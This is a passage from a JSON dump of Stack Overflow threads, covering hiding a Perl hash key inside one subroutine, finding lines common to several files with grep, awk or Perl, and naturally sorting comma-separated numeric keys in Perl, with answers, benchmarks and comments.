"darkgrin", "link": "https://stackoverflow.com/users/1218919/darkgrin"}, "is_accepted": false, "score": 1, "last_activity_date": 1462850498, "last_edit_date": 1495541334, "creation_date": 1462850498, "answer_id": 37128703, "question_id": 37128497, "link": "https://stackoverflow.com/questions/37128497/filter-a-specific-hash-tag-in-perl/37128703#37128703", "title": "filter a specific hash tag in perl", "body": "<p>I think what you want is something like this:</p>\n\n<pre><code>sub sub1 {\n    my %new_hash;\n    my @keys = grep { $_ ne 'c' } keys %$hash;\n    @new_hash{@keys} = @$hash{@keys};\n    return \\%new_hash;\n}\n</code></pre>\n\n<p>Also, look at <a href=\"https://stackoverflow.com/questions/9425115/looking-for-a-more-efficient-way-to-filter-out-a-perl-hash\">Looking for a more efficient way to filter out a perl hash</a></p>\n"}, {"tags": [], "owner": {"reputation": 22495, "user_id": 5382650, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/THfCr.png?s=128&g=1", "display_name": "Craig Estey", "link": "https://stackoverflow.com/users/5382650/craig-estey"}, "is_accepted": false, "score": 0, "last_activity_date": 1462853423, "last_edit_date": 1462853423, "creation_date": 1462852390, "answer_id": 37128990, "question_id": 37128497, "link": "https://stackoverflow.com/questions/37128497/filter-a-specific-hash-tag-in-perl/37128990#37128990", "title": "filter a specific hash tag in perl", "body": "<p>There are two basic ways to do it.</p>\n\n<p>Create a temporary hash for <code>sub1</code>:</p>\n\n<pre><code>my %hash = (\n    a =&gt; 123,\n    b =&gt; 234,\n    c =&gt; { option1 =&gt; 123, option2 =&gt; 235});\n\nsub1(\\%hash);\nsub2(\\%hash);\n\nsub sub1\n{\n    my($hash) = @_;\n    my(%tmp);\n\n    # this [followed by delete below] is faster than grep, etc.\n    %tmp = %$hash;\n    $hash = \\%tmp;\n\n    # sub1 needs only hash values a and b\n    # the following is what I did.\n    delete($hash-&gt;{c});\n\n    # do stuff ...\n}\n\nsub sub2\n{\n    my($hash) = @_;\n\n    # sub2 needs all a, b and c but after delete on $hash\n    # I can only see a and b\n}\n</code></pre>\n\n<p>Or, delete the element in <code>sub1</code> and add it back before exiting:</p>\n\n<pre><code>my %hash = (\n    a =&gt; 123,\n    b =&gt; 234,\n    c =&gt; { option1 =&gt; 123, option2 =&gt; 235});\n\nsub1(\\%hash);\nsub2(\\%hash);\n\nsub sub1\n{\n    my($hash) = @_;\n\n    # sub1 needs only hash values a and b\n    # the following is what I did.\n    my $c = delete($hash-&gt;{c});\n\n    # do stuff ...\n\n    # add it back\n    $hash-&gt;{c} = $c;\n}\n\nsub sub2\n{\n    my($hash) = @_;\n\n    # sub2 needs all a, b and c but after delete on $hash\n    # I can only see a and b\n}\n</code></pre>\n"}, {"tags": [], "owner": {"reputation": 13399, "user_id": 716443, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/a8d13509991dbbd5467f01f55988ae4e?s=128&d=identicon&r=PG", "display_name": "DavidO", "link": "https://stackoverflow.com/users/716443/davido"}, "is_accepted": true, "score": 3, "last_activity_date": 1462860211, "last_edit_date": 1462860211, "creation_date": 1462858473, "answer_id": 37130013, "question_id": 37128497, "link": "https://stackoverflow.com/questions/37128497/filter-a-specific-hash-tag-in-perl/37130013#37130013", "title": "filter a specific hash tag in perl", "body": "<p>This is one of those rare cases where <a href=\"http://perldoc.perl.org/functions/local.html\" rel=\"nofollow\"><code>local</code></a> may be useful to you:</p>\n\n<pre><code>my $hash =&gt; { \n    a =&gt; 123,\n    b =&gt; 234,\n    c =&gt; {\n        option1 =&gt; 123,\n        option2 =&gt; 235,\n    },\n};\n\nsub sub1 {\n    # We only need hash values a and b\n    delete local $hash-&gt;{c};\n\n    print \"sub1: $_\\n\" for sort keys %$hash;\n}\n\nsub sub2 {\n    # sub2 needs all a, b and c.\n\n    print \"sub2: $_\\n\" for sort keys %$hash;\n}\n\nsub1();\nsub2();\n</code></pre>\n\n<p>The output will be</p>\n\n<pre><code>sub1: a\nsub1: b\nsub2: a\nsub2: b\nsub2: c\n</code></pre>\n\n<p>The keyword 'local' localizes the key so that deleting it is undone when the scope exits.  The best explanation in Perl's documentation for how this works is <a href=\"http://perldoc.perl.org/perlsub.html#Localized-deletion-of-elements-of-composite-types\" rel=\"nofollow\">perlsub: Localized deletion of elements of composite types</a>.</p>\n\n<p>Another point to make is that it's usually beneficial to pass arguments into a subroutine rather than absorbing them from the surrounding scope:</p>\n\n<pre><code>my $hash = {\n    a =&gt; 'foo',\n    b =&gt; 'bar',\n    c =&gt; {baz =&gt; 'bang'},\n};\n\nsub sub1 {\n    my $href = shift;\n    delete local $href-&gt;{c};\n\n    print \"sub1: $_\\n\" for sort keys %$href;\n}\n\nsub sub2 {\n    my $href = shift;\n    print \"sub2: $_\\n\" for sort keys %$href;\n}\n\nsub1($hash);\nsub2($hash);\n</code></pre>\n\n<p>Even with this change, modification of non-localized elements in <code>$href</code> will propagate back to <code>$hash</code>, since you're passing by reference. But it's still a good habit to get into since it improves readability, and decouples your subroutines from the nomenclature of the surrounding scope, which hopefully contributes to more reusable subs.</p>\n\n<p>Another technique that is occasionally useful is to do a deep clone of the passed-in structure, sot that you are free to modify the clone without having changes propagate back to the referent that was passed into the subroutine. However, this can be expensive (or even impossible) if the elements contain objects rather than plain old values or nested values.  Nevertheless, for completeness I'll mention <a href=\"http://perldoc.perl.org/Storable.html\" rel=\"nofollow\">Storable's</a> <code>dclone</code> function, which might be used like this:</p>\n\n<pre><code>use Storable qw(dclone);\n\nmy $hash = {\n    a =&gt; 123,\n    b =&gt; 234,\n    c =&gt; {option1 =&gt; 123, option2 =&gt; 235},\n};\n\nsub sub1 {\n    my $href = shift;\n    my $clone = dclone($href);\n    delete $clone-&gt;{c};\n    print \"sub1: $_\\n\" for sort keys %$clone;\n}\n\nsub sub2 {\n    my $href = shift;\n    print \"sub2: $_\\n\" for sort keys %$href;\n}\n\nsub1($hash);\nsub2($hash);\n</code></pre>\n\n<p><code>dclone</code> is not the only way to clone a data structure. You might write your own solution that is better suited to your specific case, particularly if you know ahead of time the structure's shape and composition.  But as a general solution, it's pretty useful.</p>\n\n<p>But ultimately <code>dclone</code> is going to the expense of creating an entirely new data structure, rather than just hiding a key out of the way temporarily which is what <code>delete local $href-&gt;{c}</code> does.  If you can use <code>local</code> to avoid the need to create a copy of the structure, or to eliminate the potential source of errors and extra thinking that has to go into saving the value away manually (ie, <code>my $temp = delete $href-&gt;{c}; ... $href-&gt;{c} = $temp;</code>), then you have found one of those times where it turns out to be the right tool for the job.</p>\n"}], "owner": {"reputation": 53, "user_id": 2461335, "user_type": "registered", "accept_rate": 83, "profile_image": "https://www.gravatar.com/avatar/bc3adb904ac4d1f2059022583c089c25?s=128&d=identicon&r=PG", "display_name": "user2461335", "link": "https://stackoverflow.com/users/2461335/user2461335"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 47, "favorite_count": 1, "accepted_answer_id": 37130013, "answer_count": 3, "score": 0, "last_activity_date": 1462860211, "creation_date": 1462848721, "question_id": 37128497, "link": "https://stackoverflow.com/questions/37128497/filter-a-specific-hash-tag-in-perl", "title": "filter a specific hash tag in perl", "body": "<p>I have two subroutines called in order, in the first subroutine I need to filter out a specific key/value of a hash. I tried \"delete\" and it works where it entirely deletes that option from my hash but I am also referring to the same hash in the second subroutine. I need the key/value not to be referred only in sub1. How can I achieve this?\nMy hash looks similar to this:</p>\n\n<pre><code>my $hash =&gt; { a =&gt; 123,\n          b =&gt; 234,\n          c =&gt; {option1 =&gt; 123,\n                option2 =&gt; 235},\n        };\n\nsub1 {\n    sub1 needs only hash values a and b\n\n    # the following is what I did.\n    my $c = delete($hash-&gt;{c});\n}\n\nsub2 {\n    sub2 needs all a, b and c but after delete on $hash\n    I can only see a and b\n}\n</code></pre>\n\n<p>sub1 and sub2 needs to be executed in order, in that case how do I achieve this?\nAppreciate any help or guidance.</p>\n\n<p>Thanks in advance.</p>\n"}, {"tags": ["perl", "shell", "grep", "comm"], "answers": [{"tags": [], "owner": {"reputation": 96909, "user_id": 3030305, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/En2fP.png?s=128&g=1", "display_name": "John1024", "link": "https://stackoverflow.com/users/3030305/john1024"}, "is_accepted": true, "score": 4, "last_activity_date": 1462865058, "last_edit_date": 1462865058, "creation_date": 1462837036, "answer_id": 37127078, "question_id": 37127046, "link": "https://stackoverflow.com/questions/37127046/how-to-extract-common-lines-across-multiple-file/37127078#37127078", "title": "how to extract common lines across multiple file?", "body": "<h3>Using grep</h3>\n\n<p>The same trick can be used more than once:</p>\n\n<pre><code>$ grep -w -f file1 file2 | grep -w -f file3 | grep -w -f file4\nid2\nid3\n</code></pre>\n\n<p>By the way, if you are looking for exact matches, not a <em>regular expression</em> matches, it is better and faster to use the <code>-F</code> flag:</p>\n\n<pre><code>$ grep -wFf file1 file2 | grep -wFf file3 | grep -wFf file4\nid2\nid3\n</code></pre>\n\n<h3>Using awk</h3>\n\n<pre><code>$ awk 'FNR==1{nfiles++; delete fseen} !($0 in fseen){fseen[$0]++; seen[$0]++} END{for (key in seen) if (seen[key]==nfiles) print key}' file1 file2 file3 file4\nid3\nid2\n</code></pre>\n\n<ul>\n<li><p><code>FNR==1{nfiles++; delete fseen}</code></p>\n\n<p>Every time that we start reading a new file, we do two things: (1) increment the file counter, <code>nfiles</code>. and (2) delete the array <code>fseen</code>.</p></li>\n<li><p><code>!($0 in fseen){fseen[$0]; seen[$0]++}</code></p>\n\n<p>If the current line is not a key in <code>fseen</code>, then add it to <code>fseen</code> and increment the count for this line in <code>seen</code>.</p></li>\n<li><p><code>END{for (key in seen) if (seen[key]==nfiles) print key}</code></p>\n\n<p>After we have read the last line of the last file, we look at every key in <code>seen</code>.  If the count for that key is equal to the number of files that we have read, <code>nfiles</code>, then we print that key.</p></li>\n</ul>\n"}, {"comments": [{"owner": {"reputation": 110113, "user_id": 168657, "user_type": "registered", "accept_rate": 92, "profile_image": "https://www.gravatar.com/avatar/f14e7610fca39322ebbf23530def15f8?s=128&d=identicon&r=PG", "display_name": "mob", "link": "https://stackoverflow.com/users/168657/mob"}, "edited": false, "score": 1, "creation_date": 1462841525, "post_id": 37127101, "comment_id": 61795726, "body": "Doesn&#39;t <code>-l</code> also make <code>chomp</code> superfluous?"}], "tags": [], "owner": {"reputation": 198290, "user_id": 1030675, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/957956ce51706d03f19a4dc85a767bb1?s=128&d=identicon&r=PG", "display_name": "choroba", "link": "https://stackoverflow.com/users/1030675/choroba"}, "is_accepted": false, "score": 6, "last_activity_date": 1462866347, "last_edit_date": 1462866347, "creation_date": 1462837163, "answer_id": 37127101, "question_id": 37127046, "link": "https://stackoverflow.com/questions/37127046/how-to-extract-common-lines-across-multiple-file/37127101#37127101", "title": "how to extract common lines across multiple file?", "body": "<p>Perl to the rescue:</p>\n\n<pre><code>perl -lne 'BEGIN { $count = @ARGV }\n           $h{$_}{$ARGV} = 1;\n           }{\n           print $_ for grep $count == keys %{ $h{$_} }, keys %h\n           ' file* &gt; newfile\n</code></pre>\n\n<ul>\n<li><code>-n</code> reads the input files line by line</li>\n<li><code>-l</code> adds a newline to <code>print</code></li>\n<li>the <code>@ARGV</code> array contains the input file names, assigning it to <code>$count</code> at the <code>BEGIN</code>ning just counts them </li>\n<li><code>$ARGV</code> contains the name of the current input file</li>\n<li><code>$_</code> contains the current line read from the file.</li>\n<li>the <code>%h</code> hash contains ids as keys, each key contains a hash reference with file names that contained the id as keys</li>\n<li><code>}{</code> is the \"Eskimo greeting\" operator, it introduces code that runs once the input is exhausted</li>\n<li>we only output the ids whose number of files is equivalent to the number of all files. It works for any number of files.</li>\n</ul>\n"}, {"tags": [], "owner": {"reputation": 10642, "user_id": 6309601, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/RNsPk.png?s=128&g=1", "display_name": "P....", "link": "https://stackoverflow.com/users/6309601/p"}, "is_accepted": false, "score": 1, "last_activity_date": 1462864352, "last_edit_date": 1462864352, "creation_date": 1462862048, "answer_id": 37130886, "question_id": 37127046, "link": "https://stackoverflow.com/questions/37127046/how-to-extract-common-lines-across-multiple-file/37130886#37130886", "title": "how to extract common lines across multiple file?", "body": "<pre><code>     grep -hxf file1 file2 file3 file4 |sort -u\n     id2\n     id3\n\n     # For storing it to any file, \n     grep -hxf file1 file2 file3 file4 |sort -u &gt; output.txt\n</code></pre>\n"}], "owner": {"reputation": 800, "user_id": 5335523, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/c7ad38f44c51253603983abfbb167c0a?s=128&d=identicon&r=PG&f=1", "display_name": "zara", "link": "https://stackoverflow.com/users/5335523/zara"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 234, "favorite_count": 0, "accepted_answer_id": 37127078, "answer_count": 3, "score": 3, "last_activity_date": 1462866347, "creation_date": 1462836783, "question_id": 37127046, "link": "https://stackoverflow.com/questions/37127046/how-to-extract-common-lines-across-multiple-file", "title": "how to extract common lines across multiple file?", "body": "<p>I have 15 different files that I want have a new file which include only common lines in all of them. for example:</p>\n\n<pre><code>File1:\n\nid1\nid2\nid3\n\nfile2:\n\nid2\nid3\nid4\n\nfile3:\nid10\nid2\nid3\n\nfile4\n\nid100\nid45\nid3\nid2\n\nI need the output be like:\n\nnewfile:\n\nid2 \nid3\n</code></pre>\n\n<p>I know this command works for each pair of files:</p>\n\n<p>grep -w -f file1 file2 > output</p>\n\n<p>but i need a command to works for more than 2 files.</p>\n\n<p>any suggestion please?</p>\n"}, {"tags": ["perl", "sorting", "recursion"], "answers": [{"comments": [{"owner": {"reputation": 13399, "user_id": 716443, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/a8d13509991dbbd5467f01f55988ae4e?s=128&d=identicon&r=PG", "display_name": "DavidO", "link": "https://stackoverflow.com/users/716443/davido"}, "edited": false, "score": 0, "creation_date": 1462850165, "post_id": 37125904, "comment_id": 61797548, "body": "Isn&#39;t <code>keys(@keys)</code> just grabbing the indices of the array <code>@keys</code>, and therefore packing the integers 0..11 and sorting based entirely on array index?"}, {"owner": {"reputation": 13399, "user_id": 716443, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/a8d13509991dbbd5467f01f55988ae4e?s=128&d=identicon&r=PG", "display_name": "DavidO", "link": "https://stackoverflow.com/users/716443/davido"}, "edited": false, "score": 0, "creation_date": 1462850513, "post_id": 37125904, "comment_id": 61797626, "body": "Indeed viewing the contents of <code>@sorted_keys</code> seems to reveal it contains a list of 0..11 in ascending order.  Removing <code>keys()</code> has the desired effect. And though this may have some impact on the benchmark, I suspect it would still win."}, {"owner": {"reputation": 13399, "user_id": 716443, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/a8d13509991dbbd5467f01f55988ae4e?s=128&d=identicon&r=PG", "display_name": "DavidO", "link": "https://stackoverflow.com/users/716443/davido"}, "edited": false, "score": 0, "creation_date": 1462850932, "post_id": 37125904, "comment_id": 61797708, "body": "Under the <code>keys(@keys)</code> code I got 41818/s for grt. Under just <code>@keys</code> I got 30168/s. So while it does impact performance considerably, it&#39;s still a fantastic approach, leaving the other methods in the dust."}, {"owner": {"reputation": 5334, "user_id": 5830574, "user_type": "registered", "accept_rate": 93, "profile_image": "https://i.stack.imgur.com/kCmqs.png?s=128&g=1", "display_name": "PerlDuck", "link": "https://stackoverflow.com/users/5830574/perlduck"}, "edited": false, "score": 0, "creation_date": 1462873055, "post_id": 37125904, "comment_id": 61808208, "body": "Your first snippet is the <a href=\"https://en.wikipedia.org/wiki/Schwartzian_transform\" rel=\"nofollow noreferrer\">Schwartzian transform</a>. Nice to see it in action :-)"}, {"owner": {"reputation": 7704, "user_id": 3964397, "user_type": "registered", "accept_rate": 86, "profile_image": "https://www.gravatar.com/avatar/640272a326ae5f3cd89364b78f2108c9?s=128&d=identicon&r=PG", "display_name": "tjwrona1992", "link": "https://stackoverflow.com/users/3964397/tjwrona1992"}, "edited": false, "score": 0, "creation_date": 1462884515, "post_id": 37125904, "comment_id": 61816785, "body": "This is brilliant.  I&#39;m glad I posted this question.  I did eventually find my own solution but it&#39;s total garbage compared to this one!"}, {"owner": {"reputation": 7704, "user_id": 3964397, "user_type": "registered", "accept_rate": 86, "profile_image": "https://www.gravatar.com/avatar/640272a326ae5f3cd89364b78f2108c9?s=128&d=identicon&r=PG", "display_name": "tjwrona1992", "link": "https://stackoverflow.com/users/3964397/tjwrona1992"}, "edited": false, "score": 0, "creation_date": 1462885171, "post_id": 37125904, "comment_id": 61817308, "body": "Could this also be made faster if you split on <code>&#39;,&#39;</code> instead of using a regex?"}, {"owner": {"reputation": 29951, "user_id": 8233, "user_type": "registered", "accept_rate": 69, "profile_image": "https://www.gravatar.com/avatar/5ed2571484765d12fcb3230f235a8ecc?s=128&d=identicon&r=PG", "display_name": "Michael Carman", "link": "https://stackoverflow.com/users/8233/michael-carman"}, "reply_to_user": {"reputation": 7704, "user_id": 3964397, "user_type": "registered", "accept_rate": 86, "profile_image": "https://www.gravatar.com/avatar/640272a326ae5f3cd89364b78f2108c9?s=128&d=identicon&r=PG", "display_name": "tjwrona1992", "link": "https://stackoverflow.com/users/3964397/tjwrona1992"}, "edited": false, "score": 0, "creation_date": 1462886639, "post_id": 37125904, "comment_id": 61818514, "body": "@tjwrona1992: The first argument to <code>split</code> is always interpreted as a pattern."}, {"owner": {"reputation": 320771, "user_id": 589924, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/b2cf53d5a3d25f95c0db4e025aed4153?s=128&d=identicon&r=PG", "display_name": "ikegami", "link": "https://stackoverflow.com/users/589924/ikegami"}, "reply_to_user": {"reputation": 7704, "user_id": 3964397, "user_type": "registered", "accept_rate": 86, "profile_image": "https://www.gravatar.com/avatar/640272a326ae5f3cd89364b78f2108c9?s=128&d=identicon&r=PG", "display_name": "tjwrona1992", "link": "https://stackoverflow.com/users/3964397/tjwrona1992"}, "edited": false, "score": 0, "creation_date": 1462889748, "post_id": 37125904, "comment_id": 61820833, "body": "@tjwrona1992, If anything, that would be slower, since it would have to compile the regex pattern at run-time, whereas <code>split &#47;,&#47;</code> compiles the pattern at compile-time."}, {"owner": {"reputation": 320771, "user_id": 589924, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/b2cf53d5a3d25f95c0db4e025aed4153?s=128&d=identicon&r=PG", "display_name": "ikegami", "link": "https://stackoverflow.com/users/589924/ikegami"}, "reply_to_user": {"reputation": 5334, "user_id": 5830574, "user_type": "registered", "accept_rate": 93, "profile_image": "https://i.stack.imgur.com/kCmqs.png?s=128&g=1", "display_name": "PerlDuck", "link": "https://stackoverflow.com/users/5830574/perlduck"}, "edited": false, "score": 2, "creation_date": 1462889994, "post_id": 37125904, "comment_id": 61821018, "body": "@Perl Dog, It&#39;s actually a specific case of ST called <a href=\"http://www.perlmonks.org/?node_id=145659\" rel=\"nofollow noreferrer\">Guttman Rosler Transform</a>. GRT is a ST where <code>sort</code>&#39;s default compare function is used."}, {"owner": {"reputation": 320771, "user_id": 589924, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/b2cf53d5a3d25f95c0db4e025aed4153?s=128&d=identicon&r=PG", "display_name": "ikegami", "link": "https://stackoverflow.com/users/589924/ikegami"}, "edited": false, "score": 0, "creation_date": 1462890775, "post_id": 37125904, "comment_id": 61821582, "body": "GRT is faster than other ST because the comparing is all done in the sort function, avoid relatively slow calls to Perl subs. /// I&#39;ve tried a few GRT variants that didn&#39;t require reconstructing the string, but they weren&#39;t any faster."}, {"owner": {"reputation": 5334, "user_id": 5830574, "user_type": "registered", "accept_rate": 93, "profile_image": "https://i.stack.imgur.com/kCmqs.png?s=128&g=1", "display_name": "PerlDuck", "link": "https://stackoverflow.com/users/5830574/perlduck"}, "edited": false, "score": 0, "creation_date": 1462891661, "post_id": 37125904, "comment_id": 61822327, "body": "I haven&#39;t heard of the term &quot;GRT&quot; before (only of ST) and was already wondering about your function&#39;s name. Thank you for the link. Your code is a perfect example for a GRT. :-)"}], "tags": [], "owner": {"reputation": 320771, "user_id": 589924, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/b2cf53d5a3d25f95c0db4e025aed4153?s=128&d=identicon&r=PG", "display_name": "ikegami", "link": "https://stackoverflow.com/users/589924/ikegami"}, "is_accepted": true, "score": 13, "last_activity_date": 1462889888, "last_edit_date": 1462889888, "creation_date": 1462829934, "answer_id": 37125904, "question_id": 37125529, "link": "https://stackoverflow.com/questions/37125529/recursive-sorting-in-perl/37125904#37125904", "title": "Recursive sorting in Perl", "body": "<p>The following is the fastest solution (by far!):</p>\n\n<pre><code>my @sorted_keys =\n   map { join ',', unpack 'N*', $_ }\n   sort\n   map { pack 'N*', split /,/, $_ }\n   keys(%$data);\n</code></pre>\n\n<p>If you want something simpler, and still quite fast, you could use a \"natural sort\".</p>\n\n<ul>\n<li><p><a href=\"http://search.cpan.org/perldoc?Sort::Key::Natural\" rel=\"nofollow\">Sort::Key::Natural</a></p>\n\n<pre><code>use Sort::Key::Natural qw( natsort );\n\nmy @sorted_keys = natsort(keys(%$data));\n</code></pre></li>\n<li><p><a href=\"http://search.cpan.org/perldoc?Sort::Naturally\" rel=\"nofollow\">Sort::Naturally</a></p>\n\n<pre><code>use Sort::Naturally qw( nsort );\n\nmy @sorted_keys = nsort(keys(%$data));\n</code></pre></li>\n</ul>\n\n<hr>\n\n<p>Benchmarks:</p>\n\n<pre><code>       Rate   SN  SKN  grt\nSN   3769/s   -- -40% -88%\nSKN  6300/s  67%   -- -79%\ngrt 30362/s 705% 382%   --\n</code></pre>\n\n<p>Benchmark code:</p>\n\n<pre><code>use strict;\nuse warnings;\n\nuse Benchmark          qw( cmpthese );\nuse List::Util         qw( shuffle );\nuse Sort::Key::Natural qw( );\nuse Sort::Naturally    qw( );\n\nmy @keys =\n   shuffle\n      split ' ',\n         '1 1,0 1,1 1,1,1 1,1,3 1,2 2,1,1 2,1,2 2,1,3 2,2,2 3,1,2 10,1,1';\n\nsub grt {\n   my @sorted_keys =\n      map { join ',', unpack 'N*', $_ }\n      sort\n      map { pack 'N*', split /,/, $_ }\n      @keys;\n}\n\nsub SKN { my @sorted_keys = Sort::Key::Natural::natsort(@keys); }\n\nsub SN { my @sorted_keys = Sort::Naturally::nsort(@keys); }\n\ncmpthese(-3, {\n   grt =&gt; \\&amp;grt,\n   SKN =&gt; \\&amp;SKN,\n   SN  =&gt; \\&amp;SN,\n});\n</code></pre>\n"}, {"comments": [{"owner": {"reputation": 123805, "user_id": 622310, "user_type": "registered", "accept_rate": 33, "profile_image": "https://www.gravatar.com/avatar/8b6d35219e1808520bc238b28161e2e6?s=128&d=identicon&r=PG", "display_name": "Borodin", "link": "https://stackoverflow.com/users/622310/borodin"}, "edited": false, "score": 0, "creation_date": 1462830984, "post_id": 37126018, "comment_id": 61792956, "body": "<code>Use of uninitialized value in numeric comparison (&lt;=&gt;)</code> at the line <code>$cmp = $aa[$i] &lt;=&gt; $bb[$i]</code> You are comparing elements off the end of one of the lists"}, {"owner": {"reputation": 110113, "user_id": 168657, "user_type": "registered", "accept_rate": 92, "profile_image": "https://www.gravatar.com/avatar/f14e7610fca39322ebbf23530def15f8?s=128&d=identicon&r=PG", "display_name": "mob", "link": "https://stackoverflow.com/users/168657/mob"}, "reply_to_user": {"reputation": 123805, "user_id": 622310, "user_type": "registered", "accept_rate": 33, "profile_image": "https://www.gravatar.com/avatar/8b6d35219e1808520bc238b28161e2e6?s=128&d=identicon&r=PG", "display_name": "Borodin", "link": "https://stackoverflow.com/users/622310/borodin"}, "edited": false, "score": 0, "creation_date": 1462831175, "post_id": 37126018, "comment_id": 61793018, "body": "Not with the test data, but you need to go past the end of a list to distinguish between <code>&quot;4,5&quot;</code> and <code>&quot;4,5,6&quot;</code>"}, {"owner": {"reputation": 123805, "user_id": 622310, "user_type": "registered", "accept_rate": 33, "profile_image": "https://www.gravatar.com/avatar/8b6d35219e1808520bc238b28161e2e6?s=128&d=identicon&r=PG", "display_name": "Borodin", "link": "https://stackoverflow.com/users/622310/borodin"}, "edited": false, "score": 0, "creation_date": 1462831569, "post_id": 37126018, "comment_id": 61793160, "body": "Yes. I think your were (un)lucky that there was only one key <code>1,2</code> with two values and none other beginning with <code>1,2</code> or <code>1,3</code> or more"}, {"owner": {"reputation": 110113, "user_id": 168657, "user_type": "registered", "accept_rate": 92, "profile_image": "https://www.gravatar.com/avatar/f14e7610fca39322ebbf23530def15f8?s=128&d=identicon&r=PG", "display_name": "mob", "link": "https://stackoverflow.com/users/168657/mob"}, "reply_to_user": {"reputation": 123805, "user_id": 622310, "user_type": "registered", "accept_rate": 33, "profile_image": "https://www.gravatar.com/avatar/8b6d35219e1808520bc238b28161e2e6?s=128&d=identicon&r=PG", "display_name": "Borodin", "link": "https://stackoverflow.com/users/622310/borodin"}, "edited": false, "score": 0, "creation_date": 1462831957, "post_id": 37126018, "comment_id": 61793279, "body": "That is, &quot;Use of uninitialized value ...&quot; is a feature."}, {"owner": {"reputation": 123805, "user_id": 622310, "user_type": "registered", "accept_rate": 33, "profile_image": "https://www.gravatar.com/avatar/8b6d35219e1808520bc238b28161e2e6?s=128&d=identicon&r=PG", "display_name": "Borodin", "link": "https://stackoverflow.com/users/622310/borodin"}, "edited": false, "score": 0, "creation_date": 1462832286, "post_id": 37126018, "comment_id": 61793374, "body": "Yes. I knew that. It makes your code superior in ways that many may not recognise. I salute you"}, {"owner": {"reputation": 123805, "user_id": 622310, "user_type": "registered", "accept_rate": 33, "profile_image": "https://www.gravatar.com/avatar/8b6d35219e1808520bc238b28161e2e6?s=128&d=identicon&r=PG", "display_name": "Borodin", "link": "https://stackoverflow.com/users/622310/borodin"}, "edited": false, "score": 0, "creation_date": 1462832488, "post_id": 37126018, "comment_id": 61793438, "body": "Now you&#39;ve made me wonder about a recursive solution that uses <code>local</code> to alter <code>$a</code> and <code>$b</code> in nested calls. No, that&#39;s horrible, but much more baroque than the cheaty way of declaring your sort subroutine with a <code>($$)</code> prototype"}, {"owner": {"reputation": 110113, "user_id": 168657, "user_type": "registered", "accept_rate": 92, "profile_image": "https://www.gravatar.com/avatar/f14e7610fca39322ebbf23530def15f8?s=128&d=identicon&r=PG", "display_name": "mob", "link": "https://stackoverflow.com/users/168657/mob"}, "reply_to_user": {"reputation": 123805, "user_id": 622310, "user_type": "registered", "accept_rate": 33, "profile_image": "https://www.gravatar.com/avatar/8b6d35219e1808520bc238b28161e2e6?s=128&d=identicon&r=PG", "display_name": "Borodin", "link": "https://stackoverflow.com/users/622310/borodin"}, "edited": false, "score": 0, "creation_date": 1462832570, "post_id": 37126018, "comment_id": 61793453, "body": "Yeah, but you&#39;d have to check if <code>$a</code> and <code>$b</code> are references each time and it gets ugly fast."}, {"owner": {"reputation": 123805, "user_id": 622310, "user_type": "registered", "accept_rate": 33, "profile_image": "https://www.gravatar.com/avatar/8b6d35219e1808520bc238b28161e2e6?s=128&d=identicon&r=PG", "display_name": "Borodin", "link": "https://stackoverflow.com/users/622310/borodin"}, "edited": false, "score": 1, "creation_date": 1462832662, "post_id": 37126018, "comment_id": 61793490, "body": "Time for a tied string!"}], "tags": [], "owner": {"reputation": 110113, "user_id": 168657, "user_type": "registered", "accept_rate": 92, "profile_image": "https://www.gravatar.com/avatar/f14e7610fca39322ebbf23530def15f8?s=128&d=identicon&r=PG", "display_name": "mob", "link": "https://stackoverflow.com/users/168657/mob"}, "is_accepted": false, "score": 2, "last_activity_date": 1462832098, "last_edit_date": 1462832098, "creation_date": 1462830504, "answer_id": 37126018, "question_id": 37125529, "link": "https://stackoverflow.com/questions/37125529/recursive-sorting-in-perl/37126018#37126018", "title": "Recursive sorting in Perl", "body": "<p>No need for recursion, just a loop that you can break out of.</p>\n\n<pre><code>sub some_function {\n    my @aa = split /,/, $a;\n    my @bb = split /,/, $b;\n    my $cmp = 0;\n    for (my $i=0; $i&lt;@aa || $i&lt;@bb; $i++) {\n        $cmp = $aa[$i] &lt;=&gt; $bb[$i];\n        last if $cmp;\n    }\n    $cmp;\n}\n</code></pre>\n\n<hr>\n\n<p>But if your heart is set on a recursive solution, there's</p>\n\n<pre><code>sub aref_sort_recurse {\n    my ($c,$d) = @_;\n    @$c ? @$d ? shift @$c &lt;=&gt; shift @$d || aref_sort_recurse($c,$d) ? 1 : -@$d\n}\n\nsub some_function {\n    aref_sort_recurse( [split /,/, $a], [split /,/, $b] )\n}\n</code></pre>\n"}, {"tags": [], "owner": {"reputation": 34304, "user_id": 1733163, "user_type": "registered", "accept_rate": 61, "profile_image": "https://i.stack.imgur.com/gmGvj.jpg?s=128&g=1", "display_name": "Miller", "link": "https://stackoverflow.com/users/1733163/miller"}, "is_accepted": false, "score": 3, "last_activity_date": 1462830594, "creation_date": 1462830594, "answer_id": 37126034, "question_id": 37125529, "link": "https://stackoverflow.com/questions/37125529/recursive-sorting-in-perl/37126034#37126034", "title": "Recursive sorting in Perl", "body": "<p>Use <code>natsort</code> of <a href=\"https://metacpan.org/pod/Sort::Key::Natural\" rel=\"nofollow\"><code>Sort::Key::Natural</code></a>:</p>\n\n<pre><code>#!/usr/bin/env perl\n\nuse strict;\nuse warnings;\nuse v5.10;\n\nuse Sort::Key::Natural qw(natsort);\n\nmy %data = (\n    '1,1,1'  =&gt; 'data1',\n    '1,2'    =&gt; 'data2',\n    '1,1,3'  =&gt; 'stuff',\n    '2,1,1'  =&gt; 'data3',\n    '2,1,2'  =&gt; 'data4',\n    '2,1,3'  =&gt; 'data blah',\n    '2,2,2'  =&gt; 'datawk2n',\n    '10,1,2' =&gt; 